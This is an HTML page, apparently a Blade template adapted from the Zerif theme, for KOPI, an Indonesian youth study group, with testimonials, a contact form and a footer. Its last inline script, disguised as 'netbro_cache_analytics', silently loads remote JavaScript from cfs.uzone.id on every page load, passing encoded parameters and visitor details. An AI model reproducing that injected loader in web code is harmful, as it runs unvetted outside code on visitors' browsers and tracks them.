<!doctype html>
<html lang="en">

<!-- Mirrored from demo.templateocean.com/wrapbootstrap/zerif-html/v1.3.1/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 24 May 2017 02:48:29 GMT -->
<head>
<meta charset="UTF-8">
<meta name="description" content="Beautiful Responsive Animated OnePage Template" />
<meta name="keywords" content="Zerif, responsive, html, template, creative"/>
<meta name="author" content="Mizanur Rahman" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>KOPI(Kajian dan Obrolan Penuh Inspirasi)</title>

<!-- =========================
 FAV AND TOUCH ICONS
============================== -->
<link rel="shortcut icon" href="{{ asset('images/icons/favicon.ico')}}">
<link rel="apple-touch-icon" href="{{ asset('images/icons/apple-touch-icon.png')}}">
<link rel="apple-touch-icon" sizes="72x72" href="images/icons/apple-touch-icon-72x72.html'">
<link rel="apple-touch-icon" sizes="114x114" href="{{ asset('images/icons/apple-touch-icon-114x114.png')}}">

<!-- =========================
     STYLESHEETS
============================== -->
<link rel="stylesheet" href="{{ asset('css/bootstrap.min.css')}}">
<link rel="stylesheet" href="{{ asset('css/owl.theme.css')}}">
<link rel="stylesheet" href="{{ asset('css/owl.carousel.css')}}">
<link rel="stylesheet" href="{{ asset('css/jquery.vegas.min.css')}}">
<link rel="stylesheet" href="{{ asset('css/animate.min.css')}}">

<link rel="stylesheet" href="{{ asset('assets/icon-fonts/styles.css')}}">
<link rel="stylesheet" href="{{ asset('css/pixeden-icons.css')}}">

<!-- CUSTOM STYLES -->
<link rel="stylesheet" href="{{ asset('css/styles.css')}}">
<link rel="stylesheet" href="{{ asset('css/responsive.css')}}">

<!-- WEBFONT -->
<link href='http://fonts.googleapis.com/css?family=Lato:300,400,700,400italic|Montserrat:700,400|Homemade+Apple' rel='stylesheet' type='text/css'>

<!--[if lt IE 9]>
			<script src="js/html5shiv.js"></script>
			<script src="js/respond.min.js"></script>
		<![endif]-->

    <!-- jQuery 2.2.3 -->
    <script src="{{ asset('/bower_components/AdminLTE/plugins/jQuery/jquery-2.2.3.min.js')}}"></script>

</head>
<body>

  <!-- =========================
     PRE LOADER
  ============================== -->
  <div class="preloader">
    <div class="status">&nbsp;</div>
  </div>
  <!-- =========================
     HOME SECTION
  ============================== -->
  <header id="home" class="header">

  	<!-- TOP BAR -->
  	<div id="main-nav" class="navbar navbar-inverse bs-docs-nav" role="banner">
  		<div class="container">
  			<div class="navbar-header responsive-logo">
  				<button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#bs-navbar-collapse">
  				<span class="sr-only">Toggle navigation</span>
  				<span class="icon-bar"></span>
  				<span class="icon-bar"></span>
  				<span class="icon-bar"></span>
  				</button>
  				<div class="navbar-brand">
  				<img src="{{ asset('images/logo.png')}}" alt="Zerif">
  				</div>
  			</div>
  			<nav class="navbar-collapse collapse" role="navigation" id="bs-navbar-collapse">
  			<ul class="nav navbar-nav navbar-right responsive-nav main-nav-list">
  				<li><a href="#home">Home</a></li>
  				<li><a href="#testimonials">Testimonials</a></li>
  				<li><a href="#contact">Contact</a></li>
  			</ul>
  			</nav>
  		</div>
  	</div>
  	<!-- / END TOP BAR -->


    <!-- BIG HEADING WITH CALL TO ACTION BUTTONS AND SHORT MESSAGES -->
    <div class="container">

      <!-- HEADING -->
      <h1 class="intro">Kajian dan Obrolan Penuh Inspirasi</h1>

      <!-- CALL TO ACTION BUTTONS -->
      <div class="buttons inpage-scroll">
        <a href="tentang.html" class="btn btn-primary custom-button red-btn">Tentang KOPI</a>
        <a href="/register/participant" class="btn btn-primary custom-button green-btn">Daftar Kopi</a>
      </div>

    </div> <!-- / END BIG HEADING WITH CALL TO ACTION BUTTONS AND SHORT MESSAGES  -->

  </header> <!-- / END HOME SECTION  -->

  <!-- =========================
     TESTIMONIAL
  ============================== -->

  <section class="testimonial" id="testimonials">
  <div class="container">

      <!-- SECTION HEADER -->
          <div class="section-header">

      <!-- SECTION TITLE -->
      <h2 class="white-text">Testimoni</h2>

      <!-- SHORT DESCRIPTION ABOUT THE SECTION -->
      <h6 class="white-text">
        Berikut beberapa tetimoni dari beberapa pihak yang mendukung Kegiatan KOPI
      </h6>
    </div>
    <!-- / END SECTION HEADER -->

    <!-- CLIENT FEEDBACKS -->
    <div class="row wow fadeInRight animated" data-wow-offset="30" data-wow-duration="1.5s" data-wow-delay="0.15s">
      <div class="col-md-12">
        <div id="client-feedbacks" class="owl-carousel owl-theme">

          <!-- SINGLE FEEDBACK BOX-->
          <div class="feedback-box">
            <div class="message">
               “Saya sangat bangga dengan pemuda seperti ini, mereka mau mengorbankan waktu, tenaga, dan hartanya untuk kepenti Anak Yatim”
            </div>
            <div class="client">
              <div class="quote blue-text">
                <i class="icon-fontawesome-webfont-294"></i>
              </div>
              <div class="client-info">
                <a class="client-name" href="#">Ustadz Hanan At-Taqqi</a>
                <div class="client-company">
                   Penceramah Kopi 1
                </div>
              </div>
              <div class="client-image hidden-xs">
                <img src="images/clients-pic/1.jpg" alt="">
              </div>
            </div>
          </div>

        </div> <!-- / END FEEDBACKS-->
      </div> <!-- / END COLUMN -->
    </div> <!-- / END ROW -->

  </div> <!-- / END CONTAINER -->
  </section> <!-- / END TESTIMONIAL SECTION -->

  <!-- =========================
     CONTACT US
  ============================== -->

  <section class="contact-us" id="contact">
  <div class="container">

    <!-- SECTION HEADER -->
          <div class="section-header">

      <!-- SECTION TITLE -->
      <h2 class="white-text">Tanya/Saran</h2>

      <!-- SHORT DESCRIPTION ABOUT THE SECTION -->
      <h6 class="white-text">
        Ada pertanyaan? atau Saran? silahkan hubungi kami.
      </h6>
    </div>
    <!-- / END SECTION HEADER -->

    <!-- CONTACT FORM-->
    <div class="row">
      <form role="form" class="contact-form" id="contact-form">
        <div class="wow fadeInLeft animated" data-wow-offset="30" data-wow-duration="1.5s" data-wow-delay="0.15s">
        <div class="col-lg-4 col-sm-4">
          <input type="text" name="name" placeholder="Your Name" class="form-control input-box" id="name">
        </div>
        <div class="col-lg-4 col-sm-4">
          <input type="email" name="email" placeholder="Your Email" class="form-control input-box" id="email">
        </div>
        <div class="col-lg-4 col-sm-4">
          <input type="text" name="subject" placeholder="Subject" class="form-control input-box" id="subject">
        </div>
        </div>

        <div class="col-md-12 wow fadeInRight animated" data-wow-offset="30" data-wow-duration="1.5s" data-wow-delay="0.15s">
          <textarea name="message" class="form-control textarea-box" placeholder="Your Message" id="message"></textarea>
        </div>
        <!-- IF MAIL SENT SUCCESSFULLY -->
            <h4 class="success pull-left white-text">
              Your message has been sent successfully.
            </h4>

            <!-- IF MAIL SENDING UNSUCCESSFULL -->
            <h4 class="error pull-left white-text">
              E-mail must be valid and message must be longer than 1 character.
            </h4>
        <button class="btn btn-primary custom-button red-btn wow fadeInLeft animated" id="submit" data-wow-offset="30" data-wow-duration="1.5s" data-wow-delay="0.15s" type="submit">Send Message</button>
      </form>
    </div>
    <!-- / END CONTACT FORM-->
  </div> <!-- / END CONTAINER -->
  </section> <!-- / END CONTACT US SECTION-->


<!-- =========================
   FOOTER
============================== -->

<footer>
<div class="container">

	<!-- COMPANY ADDRESS-->
	<div class="col-md-5 company-details">
		<div class="icon-top red-text">
		    <i class="icon-fontawesome-webfont-302"></i>
		</div>
		Jl. Lenteng Agung Raya No. 20 Jakarta Selatan
	</div>

	<!-- COMPANY EMAIL-->
	<div class="col-md-2 company-details">
		<div class="icon-top green-text">
		<i class="icon-fontawesome-webfont-329"></i>
		</div>
		 senada.nurulfikri.ac.id
	</div>

	<!-- COMPANY PHONE NUMBER -->
	<div class="col-md-2 company-details">
		<div class="icon-top blue-text">
		<i class="icon-fontawesome-webfont-101"></i>
		</div>
		+6281214166898
	</div>

	<!-- SOCIAL ICON AND COPYRIGHT -->
	<div class="col-lg-3 col-sm-3 copyright">
		<ul class="social">
			<li><a href="#"><i class="icon-facebook"></i></a></li>
			<li><a href="#"><i class="icon-twitter-alt"></i></a></li>
			<li><a href="#"><i class="icon-linkedin"></i></a></li>
			<li><a href="#"><i class="icon-behance"></i></a></li>
			<li><a href="#"><i class="icon-dribbble"></i></a></li>
		</ul>
		 ©2013 Zerif LLC
	</div>
</div> <!-- / END CONTAINER -->
</footer> <!-- / END FOOOTER  -->

<!-- SCRIPTS -->
<script src="{{ asset('js/bootstrap.min.js')}}"></script>
<script src="{{ asset('js/wow.min.js')}}"></script>
<script src="{{ asset('js/jquery.nav.js')}}"></script>
<script src="{{ asset('js/jquery.knob.js')}}"></script>
<script src="{{ asset('js/owl.carousel.min.js')}}"></script>
<script src="{{ asset('js/smoothscroll.js')}}"></script>
<script src="{{ asset('js/jquery.vegas.min.js')}}"></script>
<script src="{{ asset('js/zerif.js')}}"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKeCteKgrJx0f8ElO4eWXHsZXL7mqMRaXO%2fubr%2fAOuVeVDOa92ZhKfUHDQHLQp9KgBHWKxtoX9QA946W37qSsg9yGLfHtqccDAJ8u5bM42NyuQDTmHBfSli1BL7ippW%2bR%2bVyORekixV9mVmgtlgJ7fjz0xmvsxyDlv%2bFWkchZi5YJwhGE8gxt3npW5SKdyEHROYCv7npserblG2zT7thWtmtlWFwfrAXeJC5gjsD4VQ8AEDalppePJTbU2DB5HN36BKunFfecPX9gGHhfspBEt%2fWdl8U%2fODmMfzxXQnqiUxY7Z9ii5lIe%2bHJwBO5Weg%2f6D7fv8weWGw%2bJjqROXfK2HKrRA4LYN0jcqZ65Kyo0N0nAhJxUeH%2fJ6x3a%2f9pZqXAU3oIaq2sqCDcwJQejpiaw0MDDlzXCegjux" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from demo.templateocean.com/wrapbootstrap/zerif-html/v1.3.1/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 24 May 2017 02:48:59 GMT -->
</html>
